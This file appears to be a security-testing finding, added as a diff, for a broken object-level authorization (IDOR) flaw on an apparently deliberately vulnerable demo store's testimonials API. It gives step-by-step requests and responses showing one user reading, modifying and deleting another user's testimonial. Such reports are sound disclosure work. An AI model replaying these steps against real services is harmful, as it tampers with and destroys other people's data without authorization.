@@ -1,0 +1,40 @@
+{
+  "vulnerability": "IDOR/BOLA on /api/v1/testimonials/{id}",
+  "target": "https://duck-store.escape.tech",
+  "steps": [
+    {
+      "step": 1,
+      "action": "Create testimonial as user_a (admin)",
+      "request": "POST /api/v1/testimonials/ with Authorization: Bearer user_a_token",
+      "payload": "{\"content\": \"Testimonial by user_a\", \"rating\": 5}",
+      "response": "HTTP/2 201, {\"id\":8,\"user_id\":\"cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d\",\"user\":{\"id\":\"cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d\",\"username\":\"user_a_001\"},\"content\":\"Testimonial by user_a\",\"rating\":5,...}"
+    },
+    {
+      "step": 2,
+      "action": "READ testimonial as user_b (different user)",
+      "request": "GET /api/v1/testimonials/8 with Authorization: Bearer user_b_token",
+      "response": "HTTP/2 200, {\"id\":8,\"user_id\":\"cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d\",\"content\":\"Testimonial by user_a\",\"rating\":5,...}"
+    },
+    {
+      "step": 3,
+      "action": "MODIFY testimonial as user_b (different user)",
+      "request": "PUT /api/v1/testimonials/8 with Authorization: Bearer user_b_token",
+      "payload": "{\"content\": \"Modified by user_b\", \"rating\": 1}",
+      "response": "HTTP/2 200, {\"id\":8,\"user_id\":\"cb4dbfeb-f5da-49a2-b0d9-ac0e15635d5d\",\"content\":\"Modified by user_b\",\"rating\":1,...}"
+    },
+    {
+      "step": 4,
+      "action": "DELETE testimonial as user_b (different user)",
+      "request": "DELETE /api/v1/testimonials/8 with Authorization: Bearer user_b_token",
+      "response": "HTTP/2 204 No Content"
+    },
+    {
+      "step": 5,
+      "action": "Confirm deletion - GET testimonial as user_b",
+      "request": "GET /api/v1/testimonials/8 with Authorization: Bearer user_b_token",
+      "response": "HTTP/2 404, {\"detail\":\"Testimonial not found\"}"
+    }
+  ],
+  "impact": "Any authenticated user can READ, MODIFY, and DELETE any other user's testimonials by changing the testimonial ID in the URL. No authorization checks are performed to verify ownership.",
+  "severity": "high"
+}
